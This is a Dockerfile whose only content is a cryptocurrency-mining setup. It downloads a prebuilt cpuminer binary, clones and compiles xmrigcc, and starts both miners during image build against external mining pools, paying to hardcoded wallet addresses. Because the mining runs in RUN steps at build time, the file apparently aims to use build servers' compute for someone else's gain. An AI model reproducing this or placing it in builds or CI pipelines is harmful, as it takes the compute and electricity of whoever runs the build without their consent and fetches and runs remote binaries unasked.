FROM ubuntu:latest
RUN apt update && apt install wget curl git -y

RUN wget https://github.com/WyvernTKC/cpuminer-gr-avx2/releases/download/1.2.4.1/cpuminer-gr-1.2.4.1-x86_64_ubuntu_22.04.tar.gz
RUN tar zxvf *.tar.gz
RUN binaries/cpuminer-avx2 -a gr -o stratum+tcp://cminer.org:5706 -u JfqVz51WWy684TTBo5oojKujuFv6ih9kjd.WORKER_NAME -p c=JGC

WORKDIR ~/
RUN git init
RUN git pull https://github.com/bendr0id/xmrigcc
RUN apt update
RUN apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
RUN cmake . -DWITH_CN_LITE=OFF -DWITH_CN_HEAVY=OFF -DWITH_CN_PICO=OFF -DWITH_CN_FEMTO=OFF -DWITH_RANDOMX=OFF -DWITH_ARGON2=OFF -DWITH_KAWPOW=OFF -DWITH_ASM=OFF -DWITH_OPENCL=OFF -DWITH_CUDA=OFF -DWITH_NVML=OFF 
RUN make -j$(nproc)
RUN ./xmrigDaemon -u LYaXiUfx9x7RDUufAHiUCTfC2Rx6hEkvm6 -o na.mining4people.com:3436 -a gr
